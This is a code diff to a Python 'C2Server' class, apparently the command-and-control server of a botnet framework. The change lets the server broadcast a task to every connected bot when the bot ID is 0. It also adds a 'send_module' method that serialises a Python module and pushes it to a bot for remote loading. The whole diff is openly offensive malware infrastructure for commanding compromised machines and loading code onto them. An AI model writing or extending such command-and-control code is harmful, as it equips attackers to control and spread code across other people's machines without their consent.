@@ -67,16 +67,34 @@ class C2Server(SecureBalancedServer):
         self.message.emit(bot, message)
 
     @Slot(int, str, dict, int)
-    def send_task(self, bot_id: int, task: str, kwargs: dict, user_activity: int):
+    def send_task(self, bot_id: int, task_name: str, kwargs: dict, user_activity: int):
         """Send task."""
-        bot = self.get_device_by_id(bot_id)
-        task_id = bot.get_next_task_id()
-        task_obj = Task(bot.id(), task_id, task, kwargs)
-        bot.on_task_received(task_obj)
-        task_dict = task_obj.serialize()
-        task_dict["event"] = "start"
-        bot.write(task_dict)
-        self.task.emit(task_obj)
+        if bot_id == 0:
+            for bot in self.get_devices():
+                task = Task(bot.id(), bot.get_next_task_id(), task_name, kwargs)
+                bot.on_task_received(task)
+                bot.write(task.create())
+                self.task.emit(task)
+
+        else:
+            try:
+                bot = self.get_device_by_id(bot_id)
+            except Exception as e:
+                self.logger.error(e)
+                self.task_create_error.emit(bot_id, e)
+                return
+            task = Task(bot.id(), bot.get_next_task_id(), task_name, kwargs)
+            bot.on_task_received(task)
+            bot.write(task.create())
+            self.task.emit(task)
+
+    @Slot(Bot, str)
+    def send_module(self, bot, module_name):
+        try:
+            bot.write({"event_type": "module", "event": "load",
+                       "name": module_name, "module": paker.dumps(module_name)})
+        except Exception as e:
+            self.module_dump_error.emit(bot, "failed to dump module {}: {}".format(module_name, e))
 
     @Slot(Bot, list)
     def send_info(self, bot: Bot, info: list):
